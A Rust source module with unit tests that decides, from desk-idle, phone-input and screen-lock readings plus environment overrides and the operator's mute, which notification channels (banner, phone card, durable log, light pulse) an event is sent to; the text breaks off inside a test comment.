//! The engine: one event in, a delivery plan out, every decision delegated.
//!
//! This module ORCHESTRATES the decision core against the probe seams; it
//! owns no policy of its own. Two properties are load-bearing and pinned by
//! recording probes rather than by outcomes alone:
//!
//! PROBES RUN ONLY WHEN THEIR ANSWER COULD MATTER. Every reading is a spawn
//! on a path that must never stall, so a caller who already stated an answer
//! never pays for the probe underneath it: an idle override skips the idle
//! read and the screen-lock read that only exists to qualify it, and a stated
//! phone-input age skips the process walk behind it.
//!
//! CALLER INTENT IS NEVER OVERRIDDEN. Skip beats force ("I already sent it"
//! is more specific than an override), the narrowing flags beat both, and
//! force exempts the event from viewed-pane suppression.

use std::collections::BTreeMap;

use crate::probes::{
    IdleProbe, PhoneInputProbe, PhoneMarkerProbe, ProbeStart, ScreenLockProbe, SessionViewProbe,
    Wants,
};
use crate::registry::Selection;
use crate::routing::Leg;
use crate::surface::{Surface, Visibility};

/// The idle threshold the bash defaults to when `PNS_DESK_IDLE_SECS` says
/// nothing: past this the operator counts as away from the desk.
pub const DEFAULT_DESK_IDLE_SECS: u64 = 120;

/// Everything the environment may override, parsed once at the edge.
/// Garbage numeric values read as absent, never as zero.
#[derive(Debug, Default, PartialEq)]
pub struct Overrides {
    pub idle_secs: Option<u64>,
    pub desk_idle_secs: Option<u64>,
    pub skip_phone: bool,
    pub force_phone: bool,
    /// A stated age for the phone's input clock, in seconds. The discovery
    /// chain behind that reading walks live processes, so a caller who
    /// already knows the answer states it and the walk never runs.
    pub phone_input_age: Option<u64>,
    /// Set when the variable was PRESENT and non-empty but not a count. The
    /// bash validators reject such a value outright rather than falling back,
    /// and the fallback is what would turn an unknown into a confident
    /// number: a probe reading where the caller overrode it, or a default
    /// threshold where the caller's was garbled.
    pub idle_invalid: bool,
    pub desk_invalid: bool,
    pub phone_invalid: bool,
    /// The operator's own typed mute, and ONE OF THE TWO FIELDS HERE THAT
    /// NEVER COME FROM THE ENVIRONMENT: it is read off a state file by the
    /// composition root and stated there. `from_env` must keep leaving it
    /// false, because a variable able to set it would let any producer mute
    /// the operator, and one able to clear it would silently end a mute they
    /// are still inside.
    pub muted: bool,
    /// A macOS Focus THE CONFIG NAMED is asserted right now, which is the
    /// operating system's own mute rather than a reading about where the
    /// operator is. It is not "a Focus is on": `[focus] silence` lists the
    /// modes that mean it, and this is already the answer to "is one of those
    /// the mode that is on".
    ///
    /// THE SECOND FIELD NEVER SET FROM THE ENVIRONMENT, for the reason above
    /// it: the composition root reads the Do Not Disturb store and states the
    /// verdict, and a variable able to force it either way would let any
    /// producer silence the operator or punch through a Focus they set.
    pub focus_active: bool,
}

impl Overrides {
    /// The operator told everything to be quiet: their own typed mute, or a
    /// macOS Focus they named in `[focus] silence`.
    ///
    /// ONE CONDITION, ONE SPELLING. The arbitration below is its first reader
    /// and the lights' own gate at the composition root is its second, and two
    /// copies of "is this event silenced" are how the two come to disagree
    /// about a lamp the operator muted.
    pub fn silenced(&self) -> bool {
        self.muted || self.focus_active
    }

    /// Whether the idle guard in `surface_reading` would consult the idle
    /// probe (and, only if that answers, the lock probe qualifying it): a
    /// stated or garbled idle clock answers the question outright, and
    /// nothing underneath an outright answer is worth spawning.
    ///
    /// ONE SPELLING, read by `start` and by the guard alike, so a probe can
    /// never be started for a reading the caller already gave.
    fn reads_desk(&self) -> bool {
        !self.idle_invalid && self.idle_secs.is_none()
    }

    /// The phone twin: whether the phone-input guard would run the
    /// discovery chain instead of trusting a stated or garbled age.
    fn reads_phone(&self) -> bool {
        !self.phone_invalid && self.phone_input_age.is_none()
    }

    /// Parse the PNS_* and PNS_* variables out of an environment map.
    pub fn from_env(vars: &BTreeMap<String, String>) -> Self {
        // A present-but-garbled value is reported alongside the None, so the
        // caller can refuse it rather than fall back to a default.
        let read = |key: &str| match vars.get(key).filter(|raw| !raw.is_empty()) {
            None => (None, false),
            Some(raw) => {
                let parsed = crate::parse_count(raw);
                (parsed, parsed.is_none())
            }
        };
        let set = |key: &str| vars.get(key).is_some_and(|raw| !raw.is_empty());
        let (idle_secs, idle_invalid) = read("PNS_IDLE_SECS");
        let (desk_idle_secs, desk_invalid) = read("PNS_DESK_IDLE_SECS");
        let (phone_input_age, phone_invalid) = read("PNS_PHONE_INPUT_AGE");
        Self {
            idle_secs,
            desk_idle_secs,
            skip_phone: set("PNS_SKIP_PHONE"),
            force_phone: set("PNS_FORCE_PHONE"),
            phone_input_age,
            idle_invalid,
            desk_invalid,
            phone_invalid,
            // NO VARIABLE READS INTO EITHER OF THESE, deliberately: see the
            // fields.
            muted: false,
            focus_active: false,
        }
    }
}

/// What the engine decided for one event.
#[derive(Debug, PartialEq)]
pub struct Decision {
    /// The legs to dispatch, in delivery order.
    pub legs: Vec<Leg>,
    /// THE PLAN AFTER ARBITRATION, which is the verdict every caller reads.
    /// The lights signal is `plan.pulse` and lives here rather than beside it
    /// as a second field: one verdict with two readers is how the two come to
    /// disagree, and the pulse is not a leg.
    pub plan: crate::surface::DeliveryPlan,
    /// The pane was dropped from the event because it failed the safety
    /// check; the caller prints the one warning.
    pub pane_dropped: bool,
    /// EVERY READING THIS DECISION RAN ON, carried out rather than thrown
    /// away, so a caller can say why the plan came out the way it did without
    /// taking a second reading that could disagree with the first.
    pub inputs: GateInputs,
}

/// Decide the plan for one event. `now_secs` is the wall clock, taken once at
/// the edge; `None` reads as an unreadable clock, which ages nothing.
///
/// ASSEMBLY ONLY. Where the operator is looking is `surface::surface`, whether
/// the origin pane is on screen is `surface::visibility`, and what to do about
/// it is `surface::plan`. This reads the probes those three need and turns the
/// plan into legs.
#[allow(clippy::too_many_arguments)]
pub fn decide<P>(
    probes: &P,
    selection: &Selection,
    overrides: &Overrides,
    local_only: bool,
    remote_only: bool,
    pane: &str,
    now_secs: Option<u64>,
    long_running: bool,
    mobile_watch_card: bool,
) -> Decision
where
    P: IdleProbe
        + PhoneMarkerProbe
        + PhoneInputProbe
        + ScreenLockProbe
        + SessionViewProbe
        + ProbeStart,
{
    let reading = surface_reading(probes, overrides, now_secs);
    let session_visibility = operator_visibility(probes, pane);
    // EVERY FIELD IS STATED HERE, once. The event-shaped half cannot be
    // filled by the reading above, and a struct assembled in two places is
    // one a later edit can leave holding a default nobody meant.
    let world = GateInputs {
        desk_input_age: reading.desk_input_age,
        phone_input_age: reading.phone_input_age,
        marker_age: reading.marker_age,
        screen_locked: reading.screen_locked,
        desk_fresh_secs: reading.desk_fresh_secs,
        surface: reading.surface,
        session_visibility,
        // The session reports one fact for every client, and a phone with
        // moshi closed is not one of them: see `surface::effective_visibility`.
        visibility: crate::surface::effective_visibility(
            reading.surface,
            reading.phone_input_fresh,
            session_visibility,
        ),
        now_secs,
        long_running,
        mobile_watch_card,
        local_only,
        remote_only,
        pane_present: !pane.is_empty(),
    };
    let delivery = crate::surface::plan(
        world.surface,
        world.visibility,
        long_running,
        mobile_watch_card,
    );
    // The two caller overrides survive the arbitration they used to steer:
    // skip beats force, and both beat the surface.
    let delivery = crate::surface::DeliveryPlan {
        phone_card: !overrides.skip_phone && (overrides.force_phone || delivery.phone_card),
        ..delivery
    };
    // THE TWO MUTES, applied LAST and therefore beating `PNS_FORCE_PHONE`
    // above them. Force is a producer's per-event opinion set in the
    // environment; the operator's mute is their own typed, expiring
    // instruction, and a macOS Focus they named in `[focus] silence` is the
    // same instruction with the operating system as its author. A mute any
    // producer can override is not a mute.
    //
    // ONE CONDITION FOR BOTH, so every downstream property (the journal, the
    // deferred replay, beating force, the decision log) follows from one rule
    // rather than from two that could drift. The durable log is not a field of
    // `DeliveryPlan`, so the record survives both of them structurally.
    //
    // A FULL STRUCT LITERAL WITH NO `..delivery`, deliberately: it is what
    // forces a future field of `DeliveryPlan` to state its own answer here
    // rather than inherit an unmuted one. Do not tidy it into a struct update.
    let delivery = if overrides.silenced() {
        crate::surface::DeliveryPlan {
            banner: false,
            phone_card: false,
            pulse: false,
        }
    } else {
        delivery
    };
    Decision {
        legs: crate::routing::channel_plan(selection, local_only, remote_only, delivery),
        plan: delivery,
        pane_dropped: !pane.is_empty() && !crate::safety::pane_is_safe(pane),
        inputs: world,
    }
}

/// Everything the delivery decision rests on, read ONCE and passed down.
///
/// THE TIMING CONTRACT, operator ruling 2026-08-13: the decision evaluates
/// the world at the LAST MOMENT BEFORE DELIVERY, and never earlier than the
/// return of the work being reported on. What that means in use: watching the
/// referenced pane when the banner would fire suppresses it, even if the
/// operator was away when the turn actually ended, and a fast shell command
/// decides effectively at its return because nothing delays it. This is the
/// clarified form of the D1-era at-send-time wording.
///
/// So the reading is taken here, at dispatch, and NOTHING BELOW THIS POINT
/// touches a probe: one decision cannot be split across two readings that
/// disagree about where the operator is.
///
/// IT IS CARRIED OUT ON THE `Decision` rather than dropped, so a caller can
/// say WHY the plan came out this way from the readings it actually ran on.
/// Re-reading a probe afterwards to answer the same question would be the
/// second reading this type exists to prevent.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct GateInputs {
    /// How long since the desk keyboard was touched. `None` is a reading
    /// nobody could take, which is never the same as zero.
    pub desk_input_age: Option<u64>,
    /// How long since the mosh client's pty was written to.
    pub phone_input_age: Option<u64>,
    /// How long since the Back Tap marker was touched.
    pub marker_age: Option<u64>,
    /// The desk display's lock, read only where the idle clock answered.
    pub screen_locked: Option<bool>,
    /// The window a signal counts as fresh inside. `None` means the threshold
    /// was garbled, so nothing could be called fresh at all.
    pub desk_fresh_secs: Option<u64>,
    /// Where the readings above put the operator.
    pub surface: Surface,
    /// What the session itself reported about the origin pane.
    pub session_visibility: Visibility,
    /// What the plan actually ran on, which differs from the session's own
    /// answer exactly where the Back Tap rewrite applied.
    pub visibility: Visibility,
    /// THE ONE CLOCK READ every age above was taken against. `None` is a
    /// clock nobody could read, which is why those ages are absent.
    pub now_secs: Option<u64>,
    /// The tier the caller stated.
    pub long_running: bool,
    /// The config's opt-in for carding a phone that is already watching.
    pub mobile_watch_card: bool,
    /// The caller's narrowing flags.
    pub local_only: bool,
    pub remote_only: bool,
    /// An origin pane was given. Its VALUE is never carried: the decision
    /// used it for exactly this and for the safety check beside it.
    pub pane_present: bool,
}

/// Where the operator is, and whether the PHONE'S OWN clock is what says so.
///
/// The two come out together because they are one judgement over one set of
/// readings. Deriving the phone's freshness a second time somewhere else is
/// how the arbitration and the visibility rule beside it would come to
/// disagree about whether the phone was just used.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
struct SurfaceReading {
    surface: Surface,
    /// The phone's pty clock is fresh: moshi is open and taking input. False
    /// on a Mobile surface means the Back Tap alone put the operator there.
    phone_input_fresh: bool,
    /// THE FOUR RAW READINGS AND THE WINDOW THEY WERE JUDGED AGAINST, carried
    /// out beside the verdict rather than dropped. Nothing downstream may
    /// re-read them: a second reading is a second moment.
    desk_input_age: Option<u64>,
    phone_input_age: Option<u64>,
    marker_age: Option<u64>,
    screen_locked: Option<bool>,
    desk_fresh_secs: Option<u64>,
}

/// Where the operator is, from the four readings the arbitration needs.
///
/// Public because the blocking hook asks the same question for a different
/// reason: whether the operator can answer from the phone at all.
///
/// EVERY READING IS GUARDED by the verdict that would discard it: a caller who
/// already stated the answer never pays for the probe underneath it.
pub fn operator_surface<P>(probes: &P, overrides: &Overrides, now_secs: Option<u64>) -> Surface
where
    P: IdleProbe + PhoneMarkerProbe + PhoneInputProbe + ScreenLockProbe + ProbeStart,
{
    surface_reading(probes, overrides, now_secs).surface
}

/// The arbitration and the freshness of the reading behind it, in one pass
/// over the probes.
fn surface_reading<P>(probes: &P, overrides: &Overrides, now_secs: Option<u64>) -> SurfaceReading
where
    P: IdleProbe + PhoneMarkerProbe + PhoneInputProbe + ScreenLockProbe + ProbeStart,
{
    // A garbled threshold is UNKNOWN, never the default: substituting 120
    // would read a stale desk as fresh and hold the operator at their desk.
    let desk_fresh_secs = if overrides.desk_invalid {
        None
    } else {
        Some(overrides.desk_idle_secs.unwrap_or(DEFAULT_DESK_IDLE_SECS))
    };
    let Some(desk_fresh_secs) = desk_fresh_secs else {
        // With no window to measure against, nothing can be called fresh,
        // and no reading below this point was ever taken.
        return SurfaceReading {
            surface: Surface::Away,
            phone_input_fresh: false,
            desk_input_age: None,
            phone_input_age: None,
            marker_age: None,
            screen_locked: None,
            desk_fresh_secs: None,
        };
    };

    // ONE START, right where the reads below are about to become certain:
    // the same two predicates the guards below consult, so an override that
    // answers a question outright never starts the probe underneath it.
    probes.start(Wants {
        desk: overrides.reads_desk(),
        phone: overrides.reads_phone(),
    });

    // THE LOCK IS READ ONLY WHERE THE IDLE CLOCK ANSWERED, because its only
    // job is to disqualify what that probe reported: a desk reading the
    // caller stated, never took, or could not take leaves the lock a spawn
    // for an answer nothing can use, and the blocked path an approval waits
    // on pays that deadline serially. Nothing in this repo sets
    // `PNS_IDLE_SECS` in production (measured repo-wide 2026-08-28); a future
    // setter would silently disable the override with it.
    let (desk_input_age, screen_locked) = if overrides.reads_desk() {
        let idle = probes.idle_secs();
        (
            idle,
            idle.is_some().then(|| probes.screen_locked()).flatten(),
        )
    } else if overrides.idle_invalid {
        (None, None)
    } else {
        (overrides.idle_secs, None)
    };
    // AGES, never timestamps, and both aged against the SAME clock read: an
    // unreadable clock ages nothing, which drops a phone signal out of the
    // arbitration rather than making it infinitely fresh.
    let age_of =
        |taken_at: Option<u64>| now_secs.and_then(|now| Some(now.saturating_sub(taken_at?)));
    let phone_input_age = if overrides.reads_phone() {
        age_of(probes.phone_input_atime_secs())
    } else if overrides.phone_invalid {
        None
    } else {
        overrides.phone_input_age
    };
    let marker_age = age_of(probes.marker_mtime_secs());
    SurfaceReading {
        surface: crate::surface::surface(
            desk_input_age,
            phone_input_age,
            marker_age,
            desk_fresh_secs,
            screen_locked,
        ),
        phone_input_fresh: crate::surface::is_fresh(phone_input_age, desk_fresh_secs),
        desk_input_age,
        phone_input_age,
        marker_age,
        screen_locked,
        desk_fresh_secs: Some(desk_fresh_secs),
    }
}

/// Whether the origin pane is on screen. An unreadable view is Unknown, which
/// never suppresses.
fn operator_visibility<P: SessionViewProbe>(probes: &P, pane: &str) -> Visibility {
    if pane.is_empty() {
        return Visibility::Unknown;
    }
    match probes.session_view(pane) {
        Some(view) => crate::surface::visibility(pane, &view),
        None => Visibility::Unknown,
    }
}

#[cfg(test)]
mod tests {
    use super::{DEFAULT_DESK_IDLE_SECS, Decision, Overrides, decide, operator_surface};
    use crate::config::parse_config;
    use crate::probes::{
        IdleProbe, PhoneInputProbe, PhoneMarkerProbe, ProbeStart, ScreenLockProbe,
        SessionViewProbe, Wants,
    };
    use crate::registry::Selection;
    use crate::routing::{Leg, ReportMode};
    use crate::surface::{DeliveryPlan, SessionView, Surface, Visibility};
    use std::cell::Cell;
    use std::collections::BTreeMap;

    /// Recording probes: every reading is counted, so a test can pin that a
    /// probe was never consulted, not only what the verdict was.
    #[derive(Default)]
    struct CountingProbes {
        idle: Option<u64>,
        marker_mtime: Option<u64>,
        phone_atime: Option<u64>,
        screen_locked: Option<bool>,
        view: Option<SessionView>,
        idle_reads: Cell<u32>,
        marker_reads: Cell<u32>,
        phone_reads: Cell<u32>,
        lock_reads: Cell<u32>,
        view_reads: Cell<u32>,
        /// What the last `start` call was asked for, synchronous and
        /// nothing to race: this double never spawns a thread, it only
        /// records what it was told.
        wants: Cell<Option<Wants>>,
    }

    impl IdleProbe for CountingProbes {
        fn idle_secs(&self) -> Option<u64> {
            self.idle_reads.set(self.idle_reads.get() + 1);
            self.idle
        }
    }
    impl PhoneMarkerProbe for CountingProbes {
        fn marker_mtime_secs(&self) -> Option<u64> {
            self.marker_reads.set(self.marker_reads.get() + 1);
            self.marker_mtime
        }
    }
    impl PhoneInputProbe for CountingProbes {
        fn phone_input_atime_secs(&self) -> Option<u64> {
            self.phone_reads.set(self.phone_reads.get() + 1);
            self.phone_atime
        }
    }
    impl ScreenLockProbe for CountingProbes {
        fn screen_locked(&self) -> Option<bool> {
            self.lock_reads.set(self.lock_reads.get() + 1);
            self.screen_locked
        }
    }
    impl SessionViewProbe for CountingProbes {
        fn session_view(&self, _origin_pane: &str) -> Option<SessionView> {
            self.view_reads.set(self.view_reads.get() + 1);
            self.view.clone()
        }
    }
    impl ProbeStart for CountingProbes {
        fn start(&self, wants: Wants) {
            self.wants.set(Some(wants));
        }
    }

    /// A view in which the origin pane is on screen, unzoomed.
    fn watching(origin: &str) -> SessionView {
        SessionView {
            origin_tab: "t1".to_string(),
            focused_tab: "t1".to_string(),
            focused_pane: origin.to_string(),
            zoomed: false,
        }
    }

    /// A view in which the origin pane's tab is not the one on screen.
    fn elsewhere(_origin: &str) -> SessionView {
        SessionView {
            origin_tab: "t1".to_string(),
            focused_tab: "t2".to_string(),
            focused_pane: "t2:p9".to_string(),
            zoomed: false,
        }
    }

    fn three_selection() -> Selection {
        crate::registry::roster()
            .enabled(
                &parse_config(
                    "[plugins.mobile]\nenabled = true\n[plugins.hermes]\nenabled = true\n[plugins.macos-banner]\nenabled = true\n",
                )
                .unwrap(),
            )
            .unwrap()
    }

    fn names(decision: &Decision) -> Vec<&str> {
        decision.legs.iter().map(|leg| leg.name).collect()
    }

    /// One event through the whole engine, with the readings a test cares
    /// about and defaults for the rest.
    fn decide_with(probes: &CountingProbes, overrides: &Overrides, pane: &str) -> Decision {
        decide(
            probes,
            &three_selection(),
            overrides,
            false,
            false,
            pane,
            Some(1_000_000),
            false,
            false,
        )
    }

    // --- the readings the decision ran on ------------------------------------

    #[test]
    fn a_decision_reports_the_readings_its_surface_was_decided_from() {
        // THE RECORD IS THE READINGS THIS DECISION RAN ON, never a second
        // reading taken afterwards. Two readings of where the operator is can
        // disagree, and an explanation taken from the later one belongs to a
        // moment the decision never saw.
        let probes = CountingProbes {
            idle: Some(30),
            marker_mtime: Some(999_400),
            phone_atime: Some(999_912),
            screen_locked: Some(false),
            view: Some(watching("wW:p1")),
            ..CountingProbes::default()
        };
        let inputs = decide_with(&probes, &Overrides::default(), "wW:p1").inputs;
        assert_eq!(inputs.desk_input_age, Some(30));
        assert_eq!(
            inputs.phone_input_age,
            Some(88),
            "aged against the one clock read"
        );
        assert_eq!(inputs.marker_age, Some(600), "aged against that same read");
        assert_eq!(inputs.screen_locked, Some(false));
        assert_eq!(inputs.desk_fresh_secs, Some(DEFAULT_DESK_IDLE_SECS));
        // THE CLOCK ITSELF, and not only the ages taken against it. The two
        // above are aged inside the surface reading, so a decision that
        // carried out no clock at all still reports them; the epoch every
        // recorded line leads with comes from THIS field, and a `None` here
        // dates every entry `-` while the ages beside it look measured.
        assert_eq!(
            inputs.now_secs,
            Some(1_000_000),
            "the one clock read, carried out on the decision it was read for"
        );
        assert_eq!(
            inputs.surface,
            Surface::Desk,
            "and the verdict those readings produced"
        );
    }

    #[test]
    fn a_decision_reports_both_the_sessions_visibility_and_the_one_the_plan_ran_on() {
        // DRILL D6 THROUGH THE RECORD. A Back Tap with moshi closed rewrites a
        // session-reported Visible to Hidden, and a record carrying only the
        // rewritten answer says the session hid the pane when the session said
        // the opposite. Both are kept, so the rewrite is visible as itself
        // rather than only in the card it produced.
        let tapped = CountingProbes {
            idle: Some(9_000),
            marker_mtime: Some(999_990),
            view: Some(watching("wW:p1")),
            ..CountingProbes::default()
        };
        let inputs = decide_with(&tapped, &Overrides::default(), "wW:p1").inputs;
        assert_eq!(inputs.surface, Surface::Mobile);
        assert_eq!(inputs.session_visibility, Visibility::Visible);
        assert_eq!(inputs.visibility, Visibility::Hidden, "the D6 rewrite");

        // D5: moshi open on the pane, where the rewrite must never reach, so
        // the two answers agree and the difference above is the rewrite alone.
        let watching_it = CountingProbes {
            idle: Some(9_000),
            phone_atime: Some(999_990),
            view: Some(watching("wW:p1")),
            ..CountingProbes::default()
        };
        let inputs = decide_with(&watching_it, &Overrides::default(), "wW:p1").inputs;
        assert_eq!(inputs.session_visibility, Visibility::Visible);
        assert_eq!(inputs.visibility, Visibility::Visible);
    }

    #[test]
    fn a_decision_reports_the_plan_it_arbitrated_and_not_the_matrix_it_started_from() {
        // THE ARBITRATED PLAN IS THE VERDICT. The matrix would banner this
        // event and the long-running tier would pulse it; the operator's mute
        // is applied after both, and a record carrying the matrix's answer
        // would explain a card that never arrived by describing one that was
        // planned.
        let probes = || CountingProbes {
            idle: Some(2),
            view: Some(elsewhere("wW:p1")),
            ..CountingProbes::default()
        };
        let long_event = |overrides: &Overrides| {
            decide(
                &probes(),
                &three_selection(),
                overrides,
                false,
                false,
                "wW:p1",
                Some(1_000_000),
                true,
                false,
            )
            .plan
        };
        assert_eq!(
            long_event(&Overrides::default()),
            DeliveryPlan {
                banner: true,
                phone_card: false,
                pulse: true,
            },
            "unmuted control: the matrix's own answer"
        );
        assert_eq!(
            long_event(&Overrides {
                muted: true,
                ..Overrides::default()
            }),
            DeliveryPlan {
                banner: false,
                phone_card: false,
                pulse: false,
            }
        );
    }

    #[test]
    fn a_reading_nobody_could_take_is_reported_as_absent_and_never_as_a_number() {
        // AN ABSENCE IS NOT A ZERO. Every field here is an `Option` precisely
        // so an unread probe stays unread in the record: a `0` would read as
        // "touched this instant" and a `false` lock would read as "the screen
        // was awake", each of which explains a decision by an observation
        // nobody made.
        let all_readable = CountingProbes {
            idle: Some(30),
            marker_mtime: Some(999_400),
            phone_atime: Some(999_912),
            screen_locked: Some(true),
            ..CountingProbes::default()
        };

        // A GARBLED THRESHOLD: there is no window, so nothing below it was
        // measured either.
        let garbled = Overrides::from_env(&BTreeMap::from([(
            "PNS_DESK_IDLE_SECS".to_string(),
            "0600".to_string(),
        )]));
        let inputs = decide_with(&all_readable, &garbled, "").inputs;
        assert_eq!(inputs.desk_fresh_secs, None, "no window to measure against");
        assert_eq!(inputs.desk_input_age, None);
        assert_eq!(inputs.phone_input_age, None);
        assert_eq!(inputs.marker_age, None);
        assert_eq!(inputs.screen_locked, None);

        // AN UNREADABLE CLOCK ages nothing, so neither phone signal has an
        // age, while the desk clock, which is an age already, still does.
        let inputs = decide(
            &all_readable,
            &three_selection(),
            &Overrides::default(),
            false,
            false,
            "",
            None,
            false,
            false,
        )
        .inputs;
        assert_eq!(inputs.phone_input_age, None, "aged against no clock");
        assert_eq!(inputs.marker_age, None, "aged against no clock");
        assert_eq!(inputs.desk_input_age, Some(30));

        // AN UNREAD LOCK is neither locked nor unlocked. The probe is skipped
        // wherever the idle clock answered nothing, which is exactly where a
        // `false` would claim a display somebody was sitting at.
        let no_idle_reading = CountingProbes {
            idle: None,
            screen_locked: Some(true),
            ..CountingProbes::default()
        };
        let inputs = decide_with(&no_idle_reading, &Overrides::default(), "").inputs;
        assert_eq!(inputs.screen_locked, None);
        assert_eq!(no_idle_reading.lock_reads.get(), 0, "and never read at all");
    }

    #[test]
    fn writing_the_record_consults_no_probe_the_decision_had_not_already_read() {
        // THE RECORD MUST NOT BECOME A SECOND READING. The whole feature is
        // worthless, and actively misleading, if any value on the line is
        // re-read after `decide` returned: two readings of where the operator
        // is can disagree, and the explanation would then belong to a moment
        // the decision never saw. AN EXTRA READ IS A FAILURE EVEN WHERE THE
        // VALUE HAPPENS TO MATCH, which is why this compares the counts rather
        // than the line.
        let reads = |also_record: bool| {
            let probes = CountingProbes {
                idle: Some(30),
                marker_mtime: Some(999_400),
                phone_atime: Some(999_912),
                screen_locked: Some(false),
                view: Some(watching("wW:p1")),
                ..CountingProbes::default()
            };
            let decision = decide_with(&probes, &Overrides::default(), "wW:p1");
            if also_record {
                crate::decision_log::line(&crate::decision_log::Record {
                    event: &crate::args::EventArgs::default(),
                    decision: &decision,
                    overrides: &Overrides::default(),
                    legs: &[],
                    nag: false,
                    permission_mode: "",
                    agent_id: "",
                    tool_name: "",
                });
            }
            [
                probes.idle_reads.get(),
                probes.marker_reads.get(),
                probes.phone_reads.get(),
                probes.lock_reads.get(),
                probes.view_reads.get(),
            ]
        };
        assert_eq!(reads(true), reads(false));
        // And every probe really was consulted, so the equality above is an
        // agreement between two live readings rather than between two zeroes.
        assert_eq!(reads(false), [1, 1, 1, 1, 1]);
    }

    // --- the plan drives the legs -------------------------------------------

    #[test]
    fn every_surface_and_visibility_pair_dispatches_the_legs_its_row_planned() {
        // The engine's half of the matrix: the model decides banner and card,
        // and these are the LEGS that come out of it. hermes is the durable
        // log and rides every row, which is what makes the other two the
        // observable difference.
        // (label, desk input age, session view, the legs it must dispatch)
        type Case = (
            &'static str,
            Option<u64>,
            Option<SessionView>,
            Vec<&'static str>,
        );
        let matrix: [Case; 5] = [
            (
                "at the desk watching the pane: log only",
                Some(2),
                Some(watching("wW:p1")),
                vec!["hermes"],
            ),
            (
                "at the desk, pane on another tab: banner",
                Some(2),
                Some(elsewhere("wW:p1")),
                vec!["macos-banner", "hermes"],
            ),
            (
                "at the desk, view unreadable: banner, never suppressed on doubt",
                Some(2),
                None,
                vec!["macos-banner", "hermes"],
            ),
            (
                "away, pane on screen: the card still fires",
                Some(9_000),
                Some(watching("wW:p1")),
                vec!["mobile", "hermes"],
            ),
            (
                "away, pane hidden: card, and no banner for an empty room",
                Some(9_000),
                Some(elsewhere("wW:p1")),
                vec!["mobile", "hermes"],
            ),
        ];
        for (label, idle, view, expected) in matrix {
            let probes = CountingProbes {
                idle,
                view,
                ..CountingProbes::default()
            };
            assert_eq!(
                names(&decide_with(&probes, &Overrides::default(), "wW:p1")),
                expected,
                "case: {label}"
            );
        }
    }

    #[test]
    fn a_phone_used_more_recently_than_the_desk_never_gets_a_banner() {
        // The property the matrix rests on: terminal-notifier is a desk
        // surface, and mobile is not the desk. The desk was touched 90s ago
        // and the phone 5s ago, which is drill D5's own scenario.
        let probes = CountingProbes {
            idle: Some(90),
            phone_atime: Some(999_995),
            view: Some(elsewhere("wW:p1")),
            ..CountingProbes::default()
        };
        let decision = decide_with(&probes, &Overrides::default(), "wW:p1");
        let legs = names(&decision);
        assert!(!legs.contains(&"macos-banner"), "got {legs:?}");
        assert!(legs.contains(&"mobile"), "got {legs:?}");
    }

    #[test]
    fn what_put_the_operator_on_mobile_decides_whether_the_watched_pane_suppresses() {
        // Both rows are on mobile with the origin pane reported as on screen,
        // and only the reason differs. Drill D6 (2026-08-19) found the first
        // one silent: the tap moved the surface, the desk display had the pane
        // focused for nobody, and mobile-plus-visible ate the card.
        // (label, marker mtime, phone pty atime, the legs it must dispatch)
        type Case = (&'static str, Option<u64>, Option<u64>, Vec<&'static str>);
        let matrix: [Case; 2] = [
            (
                "D6: tapped, moshi never opened, so nothing is being watched",
                Some(999_990),
                None,
                vec!["mobile", "hermes"],
            ),
            (
                "D5: moshi open on the pane, which is watching it for real",
                None,
                Some(999_990),
                vec!["hermes"],
            ),
        ];
        for (label, marker_mtime, phone_atime, expected) in matrix {
            let probes = CountingProbes {
                idle: Some(9_000),
                marker_mtime,
                phone_atime,
                view: Some(watching("wW:p1")),
                ..CountingProbes::default()
            };
            assert_eq!(
                names(&decide_with(&probes, &Overrides::default(), "wW:p1")),
                expected,
                "case: {label}"
            );
        }
    }

    #[test]
    fn a_tap_with_moshi_closed_cards_even_when_the_session_view_cannot_be_read() {
        // The other half of the D6 row: an unreadable view already never
        // suppressed, and the tap must not turn that into a new way to.
        let probes = CountingProbes {
            idle: Some(9_000),
            marker_mtime: Some(999_990),
            view: None,
            ..CountingProbes::default()
        };
        let decision = decide_with(&probes, &Overrides::default(), "wW:p1");
        let legs = names(&decision);
        assert!(legs.contains(&"mobile"), "got {legs:?}");
        assert!(!legs.contains(&"macos-banner"), "mobile never banners");
    }

    #[test]
    fn the_long_running_tier_pulses_and_says_so_in_the_decision() {
        let probes = CountingProbes {
            idle: Some(2),
            view: Some(watching("wW:p1")),
            ..CountingProbes::default()
        };
        let decision = decide(
            &probes,
            &three_selection(),
            &Overrides::default(),
            false,
            false,
            "wW:p1",
            Some(1_000_000),
            true,
            false,
        );
        assert!(
            decision.plan.pulse,
            "the lights ride on top of every long event"
        );
        assert_eq!(
            names(&decision),
            vec!["hermes"],
            "and change nothing else about a watched desk pane"
        );
    }

    #[test]
    fn the_mobile_watch_card_toggle_adds_the_card_only_when_it_is_on() {
        let on_the_phone = || CountingProbes {
            idle: Some(9_000),
            phone_atime: Some(999_990),
            view: Some(watching("wW:p1")),
            ..CountingProbes::default()
        };
        let with_toggle = |on: bool| {
            let probes = on_the_phone();
            let decision: Decision = decide(
                &probes,
                &three_selection(),
                &Overrides::default(),
                false,
                false,
                "wW:p1",
                Some(1_000_000),
                true,
                on,
            );
            decision.legs.iter().any(|leg| leg.name == "mobile")
        };
        assert!(!with_toggle(false), "default off: the pulse says it alone");
        assert!(with_toggle(true), "on: the card joins the pulse");
    }

    // --- the operator's mute ------------------------------------------------

    #[test]
    fn a_muted_decision_keeps_the_durable_log_and_drops_every_decorative_leg() {
        // THE MUTE IS DECORATION ONLY. hermes is not a field of the delivery
        // plan (routing sends the durable log unconditionally), so the record
        // survives a mute STRUCTURALLY, which is what makes the mute lossless
        // and safe to fail open. The two rows are the desk's banner and the
        // phone's card, each of which fires in this exact scenario unmuted.
        let muted = Overrides {
            muted: true,
            ..Overrides::default()
        };
        for (label, idle) in [
            ("at the desk: the banner", Some(2)),
            ("away: the card", Some(9_000)),
        ] {
            let probes = CountingProbes {
                idle,
                view: Some(elsewhere("wW:p1")),
                ..CountingProbes::default()
            };
            assert_eq!(
                names(&decide_with(&probes, &Overrides::default(), "wW:p1")).len(),
                2,
                "unmuted control: {label} fires alongside the log"
            );
            assert_eq!(
                names(&decide_with(&probes, &muted, "wW:p1")),
                vec!["hermes"],
                "case: {label}"
            );
        }
    }

    #[test]
    fn a_muted_decision_plans_no_pulse_even_for_a_long_running_event() {
        // THE LIGHTS ARE DECORATION TOO, and the pulse is not a leg, so
        // dropping the legs alone leaves the room flashing at an operator who
